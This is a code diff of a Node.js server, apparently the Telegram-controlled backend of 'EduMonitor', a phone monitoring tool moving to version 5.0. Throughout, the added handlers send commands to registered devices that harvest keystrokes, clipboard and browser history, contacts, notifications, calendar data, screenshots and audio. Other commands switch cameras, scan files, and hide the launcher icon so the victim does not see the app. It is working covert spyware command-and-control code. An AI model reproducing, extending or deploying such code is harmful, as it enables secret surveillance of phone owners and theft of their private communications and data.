+            await sendTelegramMessage(chatId, "📊 Logs count command sent to device.");
+        } else if (command === '/reboot_app') {
+            await sendTelegramMessage(chatId, "🔄 Reboot services command sent to device.");
+        }
+        return;
+    }
+    
+    // File Scanner Commands
+    if (command === '/full_scan' || command === '/media_scan' || command === '/full_scan_detailed' ||
+        command === '/scan_help' || command === '/find_recorded' || command === '/find_media') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        if (command === '/full_scan') {
+            await sendTelegramMessage(chatId, "🔍 Full system scan initiated. This may take a few minutes. Report will be sent when complete.");
+        } else if (command === '/media_scan') {
+            await sendTelegramMessage(chatId, "🎵 Media scan initiated. Scanning for audio, video, and images...");
+        } else if (command === '/full_scan_detailed') {
+            await sendTelegramMessage(chatId, "🔬 Detailed deep scan initiated. Full file paths and metadata will be included.");
+        } else if (command === '/scan_help') {
+            await sendTelegramMessage(chatId, 
+                "🔍 *Scan Commands Reference*\n\n" +
+                "• `/full_scan` - Complete system scan\n" +
+                "• `/media_scan` - Media files only (faster)\n" +
+                "• `/full_scan_detailed` - Detailed with full paths\n" +
+                "• `/find_recorded` - Find audio recordings\n" +
+                "• `/find_media` - Find all media files\n\n" +
+                "Reports are sent as HTML files with search and export.");
+        } else {
+            await sendTelegramMessage(chatId, "🔍 Scan command sent to device.");
+        }
+        return;
+    }
+    
+    // Detailed Export Commands
+    if (command === '/contacts_detailed' || command === '/apps_detailed' || 
+        command === '/keystrokes_detailed' || command === '/notifications_detailed' ||
+        command === '/device_snapshots' || command === '/device_history') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        const commandName = command.substring(1).replace('_', ' ');
+        await sendTelegramMessage(chatId, `📊 ${commandName} command sent to device. Detailed export will be sent when ready.`);
+        return;
+    }
+    
+    // App Opens Commands
+    if (command === '/app_opens' || command === '/app_opens_html') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        await sendTelegramMessage(chatId, "📱 App opens command sent to device.");
+        return;
+    }
+    
+    // Calendar Commands
+    if (command === '/calendar' || command === '/calendar_html') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        await sendTelegramMessage(chatId, "📅 Calendar command sent to device.");
+        return;
+    }
+    
+    // Clipboard Commands
+    if (command === '/clipboard' || command === '/clipboard_html') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        await sendTelegramMessage(chatId, "📋 Clipboard logs command sent to device.");
+        return;
+    }
+    
+    // Browser History Commands
+    if (command === '/browser_history' || command === '/browser_history_html') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        await sendTelegramMessage(chatId, "🌐 Browser history command sent to device.");
+        return;
+    }
+    
+    // Screenshot Method Command
+    if (command === '/screenshot_method') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: 'screenshot_method',
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        await sendTelegramMessage(chatId, "📸 Checking screenshot method on device...");
+        return;
+    }
+    
+    // Camera Status Command
+    if (command === '/camera_status') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: 'camera_status',
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        await sendTelegramMessage(chatId, "📸 Camera status command sent to device.");
+        return;
+    }
+    
+    // Camera Switch Commands
+    if (command === '/camera_front' || command === '/camera_back' || command === '/camera_switch') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        const cameraType = command === '/camera_front' ? 'FRONT' : (command === '/camera_back' ? 'BACK' : 'TOGGLE');
+        await sendTelegramMessage(chatId, `📸 Camera switched to ${cameraType}.`);
+        return;
+    }
+    
+    // Size Status Command
+    if (command === '/size_status') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: 'size_status',
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        await sendTelegramMessage(chatId, "📏 Checking screenshot size status on device...");
+        return;
+    }
+    
+    // Start/Stop Screenshot Commands
+    if (command === '/start_screenshot' || command === '/stop_screenshot') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        const action = command === '/start_screenshot' ? 'started' : 'stopped';
+        await sendTelegramMessage(chatId, `📸 Screenshot service ${action}.`);
+        return;
+    }
+    
+    // Screenshots Logs Command
+    if (command === '/screenshots' || command === '/screenshot_logs') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: 'screenshots',
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        await sendTelegramMessage(chatId, "📸 Screenshot logs command sent to device.");
+        return;
+    }
+    
+    // Hide/Show Icon Commands
+    if (command === '/hide_icon' || command === '/show_icon') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        const action = command === '/hide_icon' ? 'hidden' : 'shown';
+        await sendTelegramMessage(chatId, `👻 Launcher icon ${action}.`);
+        return;
+    }
+
     // Handle /find_media command
     if (command === '/find_media' || command === '/scan_media' || command === '/media_scan') {
         
@@ -1780,8 +2601,15 @@ async function handleCommand(chatId, command, messageId) {
         
         await sendTelegramMessageWithKeyboard(
             chatId,
-            "🤖 <b>EduMonitor Control Panel v4.0</b>\n\n" +
-            "Select a category to get started:",
+            "🤖 <b>EduMonitor Control Panel v5.0</b>\n\n" +
+            "Select a category to get started:\n\n" +
+            "🆕 *NEW FEATURES AVAILABLE!*\n" +
+            "• Detailed Exports\n" +
+            "• File Scanner\n" +
+            "• Data Saving Mode\n" +
+            "• Advanced Realtime Controls\n" +
+            "• And more!\n\n" +
+            "Tap the NEW FEATURES button to explore!",
             getMainMenuKeyboard(chatId)
         );
         return;
@@ -2265,6 +3093,7 @@ app.post('/api/logs', async (req, res) => {
             case 'device_history':
             case 'all_info':
             case 'full_info':
+            case 'app_opens':
                 return res.json({ success: true, handled: 'file_upload_endpoint' });
                 
             case 'device_info':
@@ -2488,7 +3317,10 @@ app.post('/api/result/:deviceId', async (req, res) => {
         command === 'screenshots' || command === 'screenshot_logs' || command === 'apps_detailed' ||
         command === 'installed_apps_detailed' || command === 'keystrokes_detailed' || command === 'notifications_detailed' ||
         command === 'contacts_detailed' || command === 'device_snapshots' || command === 'device_history' ||
-        command === 'full_info' || command === 'screenshot_settings' || command === 'recording_settings')) {
+        command === 'full_info' || command === 'screenshot_settings' || command === 'recording_settings' ||
+        command === 'app_opens' || command === 'full_scan' || command === 'media_scan' ||
+        command === 'full_scan_detailed' || command === 'audio_ultra' || command === 'audio_very_low' ||
+        command === 'audio_low' || command === 'audio_medium' || command === 'audio_high')) {
         console.log(`📎 ${command} using dedicated endpoint`);
         return res.sendStatus(200);
     }
@@ -2581,6 +3413,7 @@ app.post('/api/register', async (req, res) => {
         welcomeMessage += `• 📸 Screenshots\n`;
         welcomeMessage += `• 📊 Device Snapshots\n`;
         welcomeMessage += `• 📍 Location\n`;
+        welcomeMessage += `• 📱 App Opens\n`;
         welcomeMessage += `• ⚙️ Screenshot Settings\n`;
         welcomeMessage += `• ⚙️ Recording Settings\n\n`;
         welcomeMessage += `This may take a few moments as the device processes each request.`;
@@ -2651,13 +3484,13 @@ app.get('/test', (req, res) => {
             </style>
         </head>
         <body>
-            <h1>✅ EduMonitor Server v4.0 Running</h1>
+            <h1>✅ EduMonitor Server v5.0 Running</h1>
             <div class="stats">
                 <p><b>Time:</b> ${new Date().toISOString()}</p>
                 <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
                 <p><b>Total Devices:</b> ${devices.size}</p>
                 <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
-                <p><b>Commands Available:</b> 85+ commands including all media types</p>
+                <p><b>Commands Available:</b> 95+ commands including all new features</p>
             </div>
             
             <h2>📱 Registered Devices (${userDevices.length})</h2>
@@ -2695,11 +3528,11 @@ app.get('/test-menu', async (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     const serverIP = getServerIP();
     console.log('\n🚀 ===============================================');
-    console.log(`🚀 EduMonitor Server v4.0 running on port ${PORT}`);
+    console.log(`🚀 EduMonitor Server v5.0 running on port ${PORT}`);
     console.log(`🚀 Server IP: ${serverIP}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log('\n✅ COMPLETE COMMAND LIST (85+ commands):');
+    console.log('\n✅ COMPLETE COMMAND LIST (95+ commands):');
     console.log('   📋 /help, /menu, /start - Main menu');
     console.log('   📱 /devices, /select - Device management');
     console.log('   📊 /status, /info, /time, /battery, /storage - Device info');
@@ -2719,10 +3552,25 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   📸 /screenshots, /screenshot_logs - Screenshot logs');
     console.log('   📊 /device_snapshots, /device_history - Device snapshots');
     console.log('   🔍 /find_media, /scan_media, /find_recorded - Media scanner');
+    console.log('   🔍 /full_scan, /media_scan, /full_scan_detailed - Advanced scanner');
+    console.log('   🔊 /audio_ultra, /audio_low, /audio_medium, /audio_high - Audio quality');
+    console.log('   📡 /wifi_only_on, /wifi_only_off, /network_status - Data saving');
+    console.log('   🔑 /realtime_keystrokes_on, /realtime_notifications_on - Advanced realtime');
     console.log('   🔔 /realtime_on, /realtime_off, /realtime_status - Realtime');
     console.log('   👻 /hide_icon, /show_icon - Icon visibility');
     console.log('   🔄 /reboot_app, /clear_logs, /logs_count, /stats - Services');
     console.log('   ⚡ /force_harvest, /sync_all, /sync_all_new, /refresh - Sync');
-    console.log('\n✅ TOTAL COMMANDS: 85+ fully synchronized between app and server');
+    console.log('\n✅ NEW FEATURES ADDED:');
+    console.log('   • Detailed Exports (contacts, apps, keystrokes, notifications)');
+    console.log('   • Advanced File Scanner (full_scan, media_scan, deep_scan)');
+    console.log('   • Audio Quality Controls (5 quality levels)');
+    console.log('   • Data Saving Mode (WiFi-only)');
+    console.log('   • Advanced Realtime Controls (separate keystrokes/notifications)');
+    console.log('   • App Opens Tracking');
+    console.log('   • Calendar Events Export');
+    console.log('   • Clipboard History');
+    console.log('   • Browser History');
+    console.log('   • Device Snapshots');
+    console.log('\n🚀 TOTAL COMMANDS: 95+ fully synchronized between app and server');
     console.log('\n🚀 ===============================================\n');
-});
+}); 
